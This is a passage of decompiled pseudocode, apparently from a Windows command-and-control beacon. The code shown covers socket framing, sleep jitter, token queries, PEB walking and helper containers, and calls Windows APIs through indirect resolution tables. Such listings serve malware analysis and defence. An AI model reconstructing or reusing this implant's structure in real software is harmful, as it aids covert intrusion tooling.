      return 0xffffffff;
    }
  } while (param_3 != local_c);
  return local_c;
}



/* FUN_35d453bf2 @ 35d453bf2 */

uint FUN_35d453bf2(undefined8 param_1,longlong *param_2,uint *param_3)

{
  uint uVar1;
  longlong lVar2;
  uint local_10;
  uint local_c;
  
  local_10 = 0;
  local_c = FUN_35d453b46(param_1,(longlong)&local_10,4);
  if ((local_c == 0xffffffff) || (local_c != 4)) {
    uVar1 = 0xffffffff;
  }
  else if (local_10 == 0) {
    uVar1 = 0;
  }
  else {
    *param_3 = local_10;
    lVar2 = heap_alloc(local_10);
    *param_2 = lVar2;
    uVar1 = FUN_35d453b46(param_1,*param_2,local_10);
  }
  return uVar1;
}



/* FUN_35d453c7d @ 35d453c7d */

undefined8 FUN_35d453c7d(undefined8 param_1,longlong param_2,uint param_3)

{
  int iVar1;
  int local_14;
  int local_10;
  uint local_c;
  
  local_c = 0;
  local_14 = 0;
  while( true ) {
    local_10 = param_3 - local_c;
    if (0x2000 < param_3 - local_c) {
      local_10 = 0x2000;
    }
    iVar1 = (**(code **)(g_win32_api_table + 0x200))
                      (param_1,(int)local_c + param_2,local_10,&local_14,0);
    if (iVar1 == 0) break;
    local_c = local_14 + local_c;
    if (param_3 <= local_c) {
      return 1;
    }
  }
  return 0;
}



/* FUN_35d453d2f @ 35d453d2f */

undefined8 FUN_35d453d2f(undefined8 param_1,longlong param_2,uint param_3)

{
  undefined8 uVar1;
  uint local_res18 [4];
  
  local_res18[0] = param_3;
  uVar1 = FUN_35d453c7d(param_1,(longlong)local_res18,4);
  if ((int)uVar1 == 0) {
    uVar1 = 0;
  }
  else {
    uVar1 = FUN_35d453c7d(param_1,param_2,local_res18[0]);
  }
  return uVar1;
}



/* FUN_35d453d81 @ 35d453d81 */

uint FUN_35d453d81(ushort param_1)

{
  return (uint)param_1 << 8 | (uint)(param_1 >> 8);
}



/* FUN_35d453e85 @ 35d453e85 */

undefined8 FUN_35d453e85(undefined8 param_1,int param_2)

{
  int iVar1;
  uint uVar2;
  int local_10;
  uint local_c;
  
  iVar1 = (**(code **)(g_win32_api_table + 0x110))();
  local_c = iVar1 + param_2;
  local_10 = 0;
  while( true ) {
    iVar1 = (**(code **)(g_win32_api_table + 0x288))(param_1,0x4004667f,&local_10);
    if (iVar1 == -1) {
      return 0;
    }
    if (local_10 != 0) break;
    uVar2 = (**(code **)(g_win32_api_table + 0x110))();
    if (local_c <= uVar2) {
      return 0;
    }
    (**(code **)(g_win32_api_table + 0x1d0))(10);
  }
  return 1;
}



/* FUN_35d453f3b @ 35d453f3b */

int FUN_35d453f3b(undefined8 param_1,longlong param_2,int param_3)

{
  uint uVar1;
  longlong local_res10;
  int local_c;
  
  local_c = 0;
  local_res10 = param_2;
  if (param_3 < 1) {
    local_c = 0;
  }
  else {
    do {
      uVar1 = (**(code **)(g_win32_api_table + 0x2d0))(param_1,local_res10,param_3 - local_c,0);
      if ((uVar1 == 0) || (uVar1 == 0xffffffff)) {
        (**(code **)(g_win32_api_table + 0x2c8))(param_1,2);
        (**(code **)(g_win32_api_table + 0x2b0))(param_1);
        return -1;
      }
      local_res10 = local_res10 + (ulonglong)uVar1;
      local_c = local_c + uVar1;
    } while (local_c < param_3);
  }
  return local_c;
}



/* FUN_35d453ffe @ 35d453ffe */

int FUN_35d453ffe(undefined8 param_1,longlong *param_2,int *param_3)

{
  int iVar1;
  longlong lVar2;
  int local_10;
  int local_c;
  
  local_10 = 0;
  local_c = FUN_35d453f3b(param_1,(longlong)&local_10,4);
  if ((local_c == -1) || (local_c != 4)) {
    iVar1 = -1;
  }
  else if (local_10 == 0) {
    iVar1 = 0;
  }
  else {
    *param_3 = local_10;
    lVar2 = heap_alloc(local_10);
    *param_2 = lVar2;
    iVar1 = FUN_35d453f3b(param_1,*param_2,local_10);
  }
  return iVar1;
}



/* prng_next @ 35d454182 */

undefined4 prng_next(void)

{
  undefined4 uVar1;
  undefined4 local_c;
  
  local_c = (**(code **)(g_win32_api_table + 0x110))();
  uVar1 = (**(code **)(g_syscall_table + 0x70))(&local_c);
  return uVar1;
}



/* FUN_35d4541bf @ 35d4541bf */

char FUN_35d4541bf(void)

{
  int local_c0 [46];
  
  (**(code **)(g_win32_api_table + 0x118))(local_c0);
  return -(char)(local_c0[0] / 0x3c);
}



/* FUN_35d454216 @ 35d454216 */

undefined4 FUN_35d454216(void)

{
  undefined4 local_28;
  undefined4 local_24;
  longlong local_20;
  int local_14;
  int local_10;
  undefined4 local_c;
  
  local_10 = 0;
  local_c = 0;
  local_20 = 0;
  local_24 = 0;
  local_28 = 4;
  local_14 = (*(code *)g_syscall_table[6])(0xffffffffffffffff,8,&local_20);
  if (-1 < local_14) {
    local_10 = (**(code **)(g_win32_api_table + 0x210))(local_20,0x14,&local_24,4,&local_28);
    if (local_10 != 0) {
      local_c = local_24;
    }
  }
  if (local_20 != 0) {
    (*(code *)*g_syscall_table)(local_20);
  }
  return local_c;
}



/* FUN_35d4542df @ 35d4542df */

int FUN_35d4542df(void)

{
  undefined8 *local_38;
  undefined8 local_30;
  int local_24;
  uint local_20;
  int local_1c;
  undefined8 *local_18;
  int local_c;
  
  local_c = 0;
  local_1c = 0;
  local_20 = 0;
  local_24 = 0;
  local_30 = 0;
  (**(code **)(g_win32_api_table + 0x208))(0,&local_20);
  local_38 = (undefined8 *)heap_alloc(local_20);
  if (local_38 != (undefined8 *)0x0) {
    local_18 = local_38;
    local_1c = (**(code **)(g_win32_api_table + 0x208))(local_38,&local_20);
    if (local_1c == 0) {
      for (; local_18 != (undefined8 *)0x0; local_18 = (undefined8 *)*local_18) {
        local_1c = (**(code **)(g_syscall_table + 0x68))(local_18 + 0x38,0,&local_30,&local_24);
        if ((local_1c == 0) && (local_24 != 0)) {
          local_c = local_24;
          break;
        }
      }
    }
    heap_realloc((longlong *)&local_38,local_20);
  }
  return local_c;
}



/* FUN_35d4543ec @ 35d4543ec */

longlong FUN_35d4543ec(void)

{
  undefined4 local_14;
  longlong local_10;
  
  local_14 = 0;
  (**(code **)(g_win32_api_table + 0x218))(0,&local_14);
  local_10 = heap_alloc(local_14);
  if (local_10 != 0) {
    (**(code **)(g_win32_api_table + 0x218))(local_10,&local_14);
  }
  return local_10;
}



/* FUN_35d454455 @ 35d454455 */

longlong FUN_35d454455(void)

{
  undefined4 local_14;
  longlong local_10;
  
  local_14 = 0;
  (**(code **)(g_win32_api_table + 0x90))(0,0,&local_14);
  local_10 = heap_alloc(local_14);
  if (local_10 != 0) {
    (**(code **)(g_win32_api_table + 0x90))(0,local_10,&local_14);
  }
  return local_10;
}



/* FUN_35d4544ca @ 35d4544ca */

longlong FUN_35d4544ca(void)

{
  undefined4 local_14;
  longlong local_10;
  
  local_14 = 0;
  (**(code **)(g_win32_api_table + 0x90))(2,0,&local_14);
  local_10 = heap_alloc(local_14);
  if (local_10 != 0) {
    (**(code **)(g_win32_api_table + 0x90))(2,local_10,&local_14);
  }
  return local_10;
}



/* FUN_35d45453f @ 35d45453f */

undefined8 FUN_35d45453f(void)

{
  undefined8 uVar1;
  longlong unaff_GS_OFFSET;
  undefined4 local_c;
  
  local_c = 0;
  while (*(short *)(*(longlong *)
                     (*(longlong *)
                       (*(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 0x60) + 0x20) + 0x68)
                   + (ulonglong)
                     ((uint)(*(ushort *)
                              (*(longlong *)
                                (*(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 0x60) + 0x20)
                              + 0x60) >> 1) - local_c) * 2) != 0x5c) {
    local_c = local_c + 1;
  }
  uVar1 = heap_alloc(local_c);
  (**(code **)(g_win32_api_table + 0xe8))(0xffffffffffffffff,0,uVar1,local_c);
  return uVar1;
}



/* FUN_35d454603 @ 35d454603 */

undefined8 FUN_35d454603(void)

{
  int iVar1;
  undefined8 local_10;
  
  local_10 = 0;
  iVar1 = (**(code **)(g_syscall_table + 0x38))(0xfffffffffffffffe,8,0,&local_10);
  if (((iVar1 < 0) &&
      (iVar1 = (**(code **)(g_syscall_table + 0x38))(0xfffffffffffffffe,8,1,&local_10), iVar1 < 0)) &&
     (iVar1 = (**(code **)(g_syscall_table + 0x30))(0xffffffffffffffff,8,&local_10), iVar1 < 0)) {
    local_10 = 0;
  }
  return local_10;
}



/* FUN_35d4546aa @ 35d4546aa */

int FUN_35d4546aa(longlong param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                 undefined8 param_5,undefined4 *param_6)

{
  undefined1 local_28 [4];
  undefined4 local_24;
  undefined4 local_20;
  uint local_1c;
  undefined8 *local_18;
  int local_c;
  
  local_c = 0;
  if (param_1 != 0) {
    local_18 = (undefined8 *)0x0;
    local_1c = 0;
    local_c = (**(code **)(g_win32_api_table + 0x210))(param_1,1,0,0,&local_1c);
    if (local_c == 0) {
      local_18 = (undefined8 *)heap_alloc(local_1c);
      if (local_18 != (undefined8 *)0x0) {
        local_c = (**(code **)(g_win32_api_table + 0x210))(param_1,1,local_18,local_1c,&local_1c);
      }
    }
    local_20 = 0;
    local_24 = 4;
    (**(code **)(g_win32_api_table + 0x210))(param_1,0x14,&local_20,4,&local_24);
    if (local_c != 0) {
      local_c = (**(code **)(g_win32_api_table + 0x220))
                          (0,*local_18,param_2,param_3,param_4,param_5,local_28);
      if (local_c != 0) {
        *param_6 = local_20;
      }
    }
    if (local_18 != (undefined8 *)0x0) {
      heap_realloc((longlong *)&local_18,local_1c);
    }
  }
  return local_c;
}



/* FUN_35d45483a @ 35d45483a */

char * FUN_35d45483a(char *param_1,char param_2)

{
  char *local_res8;
  
  local_res8 = param_1;
  while( true ) {
    if (*local_res8 == '\0') {
      return (char *)0x0;
    }
    if (param_2 == *local_res8) break;
    local_res8 = local_res8 + 1;
  }
  return local_res8;
}



/* FUN_35d454872 @ 35d454872 */

char * FUN_35d454872(char *param_1,char *param_2)

{
  bool bVar1;
  char *pcVar2;
  char *pcVar3;
  
  if (param_1 != (char *)0x0) {
    DAT_35d45b0a0 = param_1;
  }
  if (DAT_35d45b0a0 == (char *)0x0) {
    pcVar2 = (char *)0x0;
  }
  else {
    while( true ) {
      if ((*DAT_35d45b0a0 == '\0') ||
         (pcVar2 = FUN_35d45483a(param_2,*DAT_35d45b0a0), pcVar2 == (char *)0x0)) {
        bVar1 = false;
      }
      else {
        bVar1 = true;
      }
      pcVar2 = DAT_35d45b0a0;
      if (!bVar1) break;
      DAT_35d45b0a0 = DAT_35d45b0a0 + 1;
    }
    if (*DAT_35d45b0a0 == '\0') {
      pcVar2 = (char *)0x0;
    }
    else {
      while( true ) {
        if ((*DAT_35d45b0a0 == '\0') ||
           (pcVar3 = FUN_35d45483a(param_2,*DAT_35d45b0a0), pcVar3 != (char *)0x0)) {
          bVar1 = false;
        }
        else {
          bVar1 = true;
        }
        if (!bVar1) break;
        DAT_35d45b0a0 = DAT_35d45b0a0 + 1;
      }
      if (*DAT_35d45b0a0 != '\0') {
        *DAT_35d45b0a0 = '\0';
        DAT_35d45b0a0 = DAT_35d45b0a0 + 1;
      }
    }
  }
  return pcVar2;
}



/* FUN_35d45499b @ 35d45499b */

int FUN_35d45499b(byte *param_1,byte *param_2)

{
  byte *local_res8;
  byte *local_res10;
  
  local_res10 = param_2;
  for (local_res8 = param_1; (*local_res8 != 0 && (*local_res8 == *local_res10));
      local_res8 = local_res8 + 1) {
    local_res10 = local_res10 + 1;
  }
  return (uint)*local_res8 - (uint)*local_res10;
}



/* FUN_35d4549ea @ 35d4549ea */

int FUN_35d4549ea(byte *param_1,byte *param_2,longlong param_3)

{
  int iVar1;
  byte *local_res8;
  byte *local_res10;
  longlong local_res18;
  
  local_res10 = param_2;
  local_res18 = param_3;
  for (local_res8 = param_1;
      ((local_res18 != 0 && (*local_res8 != 0)) && (*local_res8 == *local_res10));
      local_res8 = local_res8 + 1) {
    local_res10 = local_res10 + 1;
    local_res18 = local_res18 + -1;
  }
  if (local_res18 == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = (uint)*local_res8 - (uint)*local_res10;
  }
  return iVar1;
}



/* strlen_wrapper @ 35d454be2 */

int strlen_wrapper(longlong param_1)

{
  undefined4 local_c;
  
  local_c = 0;
  if (param_1 != 0) {
    for (; *(char *)(param_1 + local_c) != '\0'; local_c = local_c + 1) {
    }
  }
  return local_c;
}



/* string_compare @ 35d454c1b */

int string_compare(longlong param_1,char param_2)

{
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (*(char *)(param_1 + local_c) == '\0') {
      return -1;
    }
    if (param_2 == *(char *)(param_1 + local_c)) break;
    local_c = local_c + 1;
  }
  return local_c;
}



/* string_copy @ 35d454d04 */

uint string_copy(undefined8 param_1)

{
  byte bVar1;
  uint uVar2;
  undefined4 local_res8;
  undefined4 uStackX_c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  
  local_res8 = (uint)param_1;
  uStackX_c = (int)((ulonglong)param_1 >> 0x20);
  if (local_res8 < 0xd53e8000) {
    local_24 = uStackX_c + 0xfe624e21;
  }
  else {
    local_24 = uStackX_c + 0xfe624e22;
  }
  local_28 = local_res8 + 0x2ac18000;
  local_c = 0;
  local_10 = 0;
  for (local_14 = 0x3f; -1 < local_14; local_14 = local_14 + -1) {
    bVar1 = (byte)local_14;
    if (local_14 < 0x20) {
      uVar2 = local_28 >> (bVar1 & 0x1f);
    }
    else {
      uVar2 = local_24 >> (bVar1 - 0x20 & 0x1f);
    }
    local_10 = local_10 << 1 | uVar2 & 1;
    if (9999999 < local_10) {
      local_10 = local_10 - 10000000;
      local_c = local_c | 1 << (bVar1 & 0x1f);
    }
  }
  return local_c;
}



/* get_tick_count @ 35d454ddb */

void get_tick_count(void)

{
  undefined8 local_10;
  
  (**(code **)(g_win32_api_table + 0x108))(&local_10);
  string_copy(local_10);
  return;
}



/* string_concat @ 35d454e0b */

void string_concat(undefined8 param_1,int param_2,longlong param_3,longlong param_4)

{
  (**(code **)(g_win32_api_table + 0x1f8))
            (0,0,param_1,(ulonglong)(longlong)param_2 >> 1 & 0xffffffff,param_3,(int)param_4,0,0);
  *(undefined1 *)(param_3 + param_4 + -1) = 0;
  return;
}



/* string_format_sprintf @ 35d454f27 */

void string_format_sprintf(longlong param_1,int param_2,int param_3,int param_4)

{
  uint uVar1;
  int iVar2;
  undefined4 local_10;
  undefined4 local_c;
  
  local_c = 0;
  if (param_2 == 0) {
    if ((param_3 != 0) && (local_c = param_3 * 1000, param_4 != 0)) {
      local_10 = 0;
      uVar1 = (uint)(param_3 * param_4) / 100;
      if (uVar1 != 0) {
        local_10 = prng_next();
        local_10 = local_10 % uVar1;
      }
      if (local_10 < local_c) {
        local_c = local_c - local_10;
      }
    }
  }
  else {
    local_c = param_2 * 1000;
  }
  if (param_1 == 0) {
    (**(code **)(g_win32_api_table + 0x1d0))(local_c);
  }
  else {
    iVar2 = (**(code **)(g_win32_api_table + 0x1e8))(param_1,local_c);
    if (iVar2 == 0) {
      (**(code **)(g_win32_api_table + 0x1c8))(param_1);
    }
  }
  return;
}



/* GetVersions @ 35d455050 */

/* GetVersions() */

void GetVersions(void)

{
                    /* 0x15050  1  _Z11GetVersionsv */
  return;
}



/* entry @ 35d455057 */

undefined8 entry(void)

{
  beacon_main_loop();
  return 1;
}



/* FUN_35d4550b0 @ 35d4550b0 */

void FUN_35d4550b0(undefined8 *param_1)

{
  *param_1 = &VTABLE_ConnectorHTTP;
  FUN_35d456b50(param_1);
  return;
}



/* linked_list_init @ 35d4550e0 */

void linked_list_init(undefined8 *param_1)

{
  FUN_35d4563a0(param_1);
  return;
}



/* critical_section_init @ 35d455480 */

void critical_section_init(undefined8 *param_1)

{
  undefined8 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x128))(0,0,0);
  param_1[3] = uVar1;
  return;
}



/* critical_section_enter @ 35d4554e0 */

undefined8 critical_section_enter(longlong *param_1,int *param_2,undefined8 *param_3)

{
  undefined8 uVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  ulonglong uVar4;
  undefined8 uVar5;
  int *piVar6;
  longlong lVar7;
  
  uVar4 = FUN_35d456c20(param_1,param_2);
  if ((int)uVar4 == -1) {
    if ((ulonglong)param_1[1] <= (ulonglong)param_1[2]) {
      if (param_1[1] == 0) {
        lVar7 = 1;
      }
      else {
        lVar7 = param_1[1] * 2;
      }
      uVar5 = FUN_35d455740(param_1,lVar7);
      if ((int)uVar5 == 0) {
        return 0;
      }
    }
    lVar7 = param_1[2];
    param_1[2] = lVar7 + 1;
    piVar6 = (int *)(lVar7 * 0x28 + *param_1);
    uVar5 = *param_3;
    uVar1 = param_3[1];
    uVar2 = param_3[2];
    uVar3 = param_3[3];
    *piVar6 = *param_2;
    *(undefined8 *)(piVar6 + 2) = uVar5;
    *(undefined8 *)(piVar6 + 4) = uVar1;
    *(undefined8 *)(piVar6 + 6) = uVar2;
    *(undefined8 *)(piVar6 + 8) = uVar3;
  }
  else {
    lVar7 = *param_1 + (longlong)(int)uVar4 * 0x28;
    uVar5 = param_3[1];
    *(undefined8 *)(lVar7 + 8) = *param_3;
    *(undefined8 *)(lVar7 + 0x10) = uVar5;
    uVar5 = param_3[3];
    *(undefined8 *)(lVar7 + 0x18) = param_3[2];
    *(undefined8 *)(lVar7 + 0x20) = uVar5;
  }
  return 1;
}



/* FUN_35d455650 @ 35d455650 */

undefined8 FUN_35d455650(longlong *param_1,int *param_2)

{
  undefined8 *puVar1;
  ulonglong uVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  ulonglong local_18;
  
  uVar2 = FUN_35d456c20(param_1,param_2);
  if ((int)uVar2 == -1) {
    uVar3 = 0;
  }
  else {
    for (local_18 = (ulonglong)(int)uVar2; local_18 < param_1[2] - 1U; local_18 = local_18 + 1) {
      puVar1 = (undefined8 *)(*param_1 + (local_18 + 1) * 0x28);
      puVar4 = (undefined8 *)(local_18 * 0x28 + *param_1);
      uVar3 = puVar1[1];
      *puVar4 = *puVar1;
      puVar4[1] = uVar3;
      uVar3 = puVar1[3];
      puVar4[2] = puVar1[2];
      puVar4[3] = uVar3;
      puVar4[4] = puVar1[4];
    }
    param_1[2] = param_1[2] + -1;
    uVar3 = 1;
  }
  return uVar3;
}



/* FUN_35d455740 @ 35d455740 */

undefined8 FUN_35d455740(longlong *param_1,longlong param_2)

{
  undefined8 *puVar1;
  longlong lVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  ulonglong local_18;
  
  lVar2 = (**(code **)(g_win32_api_table + 0x120))(param_1[3],0,param_2 * 0x28);
  if (lVar2 == 0) {
    uVar3 = 0;
  }
  else {
    if (*param_1 != 0) {
      for (local_18 = 0; local_18 < (ulonglong)param_1[2]; local_18 = local_18 + 1) {
        puVar1 = (undefined8 *)(*param_1 + local_18 * 0x28);
        puVar4 = (undefined8 *)(lVar2 + local_18 * 0x28);
        uVar3 = puVar1[1];
        *puVar4 = *puVar1;
        puVar4[1] = uVar3;
        uVar3 = puVar1[3];
        puVar4[2] = puVar1[2];
        puVar4[3] = uVar3;
        puVar4[4] = puVar1[4];
      }
      (**(code **)(g_win32_api_table + 0x140))(param_1[3],0,*param_1);
    }
    *param_1 = lVar2;
    param_1[1] = param_2;
    uVar3 = 1;
  }
  return uVar3;
}



/* connector_base_constructor @ 35d455890 */

void connector_base_constructor(undefined8 *param_1)

{
  undefined8 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x128))(0,0,0);
  param_1[3] = uVar1;
  return;
}



/* FUN_35d4558f0 @ 35d4558f0 */

longlong FUN_35d4558f0(longlong *param_1,int *param_2)

{
  ulonglong uVar1;
  undefined1 local_40 [16];
  undefined1 local_30 [16];
  int local_14;
  
  uVar1 = FUN_35d456c20(param_1,param_2);
  local_14 = (int)uVar1;
  if (local_14 == -1) {
    local_40 = (undefined1  [16])0x0;
    local_30 = (undefined1  [16])0x0;
    critical_section_enter(param_1,param_2,(undefined8 *)local_40);
    uVar1 = FUN_35d456c20(param_1,param_2);
    local_14 = (int)uVar1;
  }
  return (longlong)local_14 * 0x28 + *param_1 + 8;
}



/* FUN_35d455980 @ 35d455980 */

undefined8 FUN_35d455980(longlong *param_1,ulonglong param_2)

{
  undefined8 uVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  ulonglong local_18;
  
  local_18 = param_2;
  if (param_2 < (ulonglong)param_1[2]) {
    for (; local_18 < param_1[2] - 1U; local_18 = local_18 + 1) {
      puVar3 = (undefined8 *)((local_18 + 1) * 0x40 + *param_1);
      puVar2 = (undefined8 *)(*param_1 + local_18 * 0x40);
      uVar1 = puVar3[1];
      *puVar2 = *puVar3;
      puVar2[1] = uVar1;
      uVar1 = puVar3[3];
      puVar2[2] = puVar3[2];
      puVar2[3] = uVar1;
      uVar1 = puVar3[5];
      puVar2[4] = puVar3[4];
      puVar2[5] = uVar1;
      uVar1 = puVar3[7];
      puVar2[6] = puVar3[6];
      puVar2[7] = uVar1;
    }
    param_1[2] = param_1[2] + -1;
    uVar1 = 1;
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



/* FUN_35d455a60 @ 35d455a60 */

undefined8 FUN_35d455a60(longlong *param_1,longlong param_2)

{
  longlong lVar1;
  undefined8 uVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  ulonglong local_18;
  
  lVar1 = (**(code **)(g_win32_api_table + 0x120))(param_1[3],0,param_2 << 6);
  if (lVar1 == 0) {
    uVar2 = 0;
  }
  else {
    if (*param_1 != 0) {
      for (local_18 = 0; local_18 < (ulonglong)param_1[2]; local_18 = local_18 + 1) {
        puVar4 = (undefined8 *)(local_18 * 0x40 + *param_1);
        puVar3 = (undefined8 *)(lVar1 + local_18 * 0x40);
        uVar2 = puVar4[1];
        *puVar3 = *puVar4;
        puVar3[1] = uVar2;
        uVar2 = puVar4[3];
        puVar3[2] = puVar4[2];
        puVar3[3] = uVar2;
        uVar2 = puVar4[5];
        puVar3[4] = puVar4[4];
        puVar3[5] = uVar2;
        uVar2 = puVar4[7];
        puVar3[6] = puVar4[6];
        puVar3[7] = uVar2;
      }
      (**(code **)(g_win32_api_table + 0x140))(param_1[3],0,*param_1);
    }
    *param_1 = lVar1;
    param_1[1] = param_2;
    uVar2 = 1;
  }
  return uVar2;
}



/* FUN_35d455bb0 @ 35d455bb0 */

bool FUN_35d455bb0(longlong *param_1,undefined8 *param_2)

{
  undefined8 *puVar1;
  longlong lVar2;
  undefined8 uVar3;
  longlong lVar4;
  
  if ((ulonglong)param_1[1] <= (ulonglong)param_1[2]) {
    if (param_1[1] == 0) {
      lVar4 = 1;
    }
    else {
      lVar4 = param_1[1] * 2;
    }
    FUN_35d455a60(param_1,lVar4);
  }
  lVar4 = *param_1;
  if (lVar4 != 0) {
    lVar2 = param_1[2];
    param_1[2] = lVar2 + 1;
    puVar1 = (undefined8 *)(*param_1 + lVar2 * 0x40);
    uVar3 = param_2[1];
    *puVar1 = *param_2;
    puVar1[1] = uVar3;
    uVar3 = param_2[3];
    puVar1[2] = param_2[2];
    puVar1[3] = uVar3;
    uVar3 = param_2[5];
    puVar1[4] = param_2[4];
    puVar1[5] = uVar3;
    uVar3 = param_2[7];
    puVar1[6] = param_2[6];
    puVar1[7] = uVar3;
  }
  return lVar4 != 0;
}



/* FUN_35d455c90 @ 35d455c90 */

void FUN_35d455c90(undefined8 *param_1)

{
  undefined8 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x128))(0,0,0);
  param_1[3] = uVar1;
  return;
}



/* FUN_35d455cf0 @ 35d455cf0 */

longlong FUN_35d455cf0(longlong *param_1,longlong param_2)

{
  return *param_1 + param_2 * 0x40;
}



/* FUN_35d455d10 @ 35d455d10 */

undefined8 FUN_35d455d10(longlong *param_1,ulonglong param_2)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  undefined8 *puVar3;
  ulonglong local_18;
  
  local_18 = param_2;
  if (param_2 < (ulonglong)param_1[2]) {
    for (; local_18 < param_1[2] - 1U; local_18 = local_18 + 1) {
      puVar1 = (undefined8 *)(*param_1 + (local_18 + 1) * 0x28);
      puVar3 = (undefined8 *)(local_18 * 0x28 + *param_1);
      uVar2 = puVar1[1];
      *puVar3 = *puVar1;
      puVar3[1] = uVar2;
      uVar2 = puVar1[3];
      puVar3[2] = puVar1[2];
      puVar3[3] = uVar2;
      puVar3[4] = puVar1[4];
    }
    param_1[2] = param_1[2] + -1;
    uVar2 = 1;
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}



/* FUN_35d455df0 @ 35d455df0 */

undefined8 FUN_35d455df0(longlong *param_1,longlong param_2)

{
  undefined8 *puVar1;
  longlong lVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  ulonglong local_18;
  
  lVar2 = (**(code **)(g_win32_api_table + 0x120))(param_1[3],0,param_2 * 0x28);
  if (lVar2 == 0) {
    uVar3 = 0;
  }
  else {
    if (*param_1 != 0) {
      for (local_18 = 0; local_18 < (ulonglong)param_1[2]; local_18 = local_18 + 1) {
        puVar1 = (undefined8 *)(*param_1 + local_18 * 0x28);
        puVar4 = (undefined8 *)(lVar2 + local_18 * 0x28);
        uVar3 = puVar1[1];
        *puVar4 = *puVar1;
        puVar4[1] = uVar3;
        uVar3 = puVar1[3];
        puVar4[2] = puVar1[2];
        puVar4[3] = uVar3;
        puVar4[4] = puVar1[4];
      }
      (**(code **)(g_win32_api_table + 0x140))(param_1[3],0,*param_1);
    }
    *param_1 = lVar2;
    param_1[1] = param_2;
    uVar3 = 1;
  }
  return uVar3;
}



/* FUN_35d455f40 @ 35d455f40 */

bool FUN_35d455f40(longlong *param_1,undefined8 *param_2)

{
  undefined8 *puVar1;
  longlong lVar2;
  undefined8 uVar3;
  longlong lVar4;
  
  if ((ulonglong)param_1[1] <= (ulonglong)param_1[2]) {
    if (param_1[1] == 0) {
      lVar4 = 1;
    }
    else {
      lVar4 = param_1[1] * 2;
    }
    FUN_35d455df0(param_1,lVar4);
  }
  lVar4 = *param_1;
  if (lVar4 != 0) {
    lVar2 = param_1[2];
    param_1[2] = lVar2 + 1;
    puVar1 = (undefined8 *)(*param_1 + lVar2 * 0x28);
    uVar3 = param_2[1];
    *puVar1 = *param_2;
    puVar1[1] = uVar3;
    uVar3 = param_2[3];
    puVar1[2] = param_2[2];
    puVar1[3] = uVar3;
    puVar1[4] = param_2[4];
  }
  return lVar4 != 0;
}



/* FUN_35d456010 @ 35d456010 */

void FUN_35d456010(undefined8 *param_1)

{
  undefined8 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x128))(0,0,0);
  param_1[3] = uVar1;
  return;
}



/* FUN_35d456070 @ 35d456070 */

longlong FUN_35d456070(longlong *param_1,longlong param_2)

{
  return param_2 * 0x28 + *param_1;
}



/* FUN_35d4560a0 @ 35d4560a0 */

undefined8 FUN_35d4560a0(longlong *param_1,ulonglong param_2)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  undefined8 *puVar3;
  ulonglong local_18;
  
  local_18 = param_2;
  if (param_2 < (ulonglong)param_1[2]) {
    for (; local_18 < param_1[2] - 1U; local_18 = local_18 + 1) {
      puVar1 = (undefined8 *)(*param_1 + (local_18 + 1) * 0x28);
      puVar3 = (undefined8 *)(local_18 * 0x28 + *param_1);
      uVar2 = puVar1[1];
      *puVar3 = *puVar1;
      puVar3[1] = uVar2;
      uVar2 = puVar1[3];
      puVar3[2] = puVar1[2];
      puVar3[3] = uVar2;
      puVar3[4] = puVar1[4];
    }
    param_1[2] = param_1[2] + -1;
    uVar2 = 1;
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}



/* FUN_35d456180 @ 35d456180 */

undefined8 FUN_35d456180(longlong *param_1,longlong param_2)

{
  undefined8 *puVar1;
  longlong lVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  ulonglong local_18;
  
  lVar2 = (**(code **)(g_win32_api_table + 0x120))(param_1[3],0,param_2 * 0x28);
  if (lVar2 == 0) {
    uVar3 = 0;
  }
  else {
    if (*param_1 != 0) {
      for (local_18 = 0; local_18 < (ulonglong)param_1[2]; local_18 = local_18 + 1) {
        puVar1 = (undefined8 *)(*param_1 + local_18 * 0x28);
        puVar4 = (undefined8 *)(lVar2 + local_18 * 0x28);
        uVar3 = puVar1[1];
        *puVar4 = *puVar1;
        puVar4[1] = uVar3;
        uVar3 = puVar1[3];
        puVar4[2] = puVar1[2];
        puVar4[3] = uVar3;
        puVar4[4] = puVar1[4];
      }
      (**(code **)(g_win32_api_table + 0x140))(param_1[3],0,*param_1);
    }
    *param_1 = lVar2;
    param_1[1] = param_2;
    uVar3 = 1;
  }
  return uVar3;
}



/* FUN_35d4562d0 @ 35d4562d0 */

bool FUN_35d4562d0(longlong *param_1,undefined8 *param_2)

{
  undefined8 *puVar1;
  longlong lVar2;
  undefined8 uVar3;
  longlong lVar4;
  
  if ((ulonglong)param_1[1] <= (ulonglong)param_1[2]) {
    if (param_1[1] == 0) {
      lVar4 = 1;
    }
    else {
      lVar4 = param_1[1] * 2;
    }
    FUN_35d456180(param_1,lVar4);
  }
  lVar4 = *param_1;
  if (lVar4 != 0) {
    lVar2 = param_1[2];
    param_1[2] = lVar2 + 1;
    puVar1 = (undefined8 *)(*param_1 + lVar2 * 0x28);
    uVar3 = param_2[1];
    *puVar1 = *param_2;
    puVar1[1] = uVar3;
    uVar3 = param_2[3];
    puVar1[2] = param_2[2];
    puVar1[3] = uVar3;
    puVar1[4] = param_2[4];
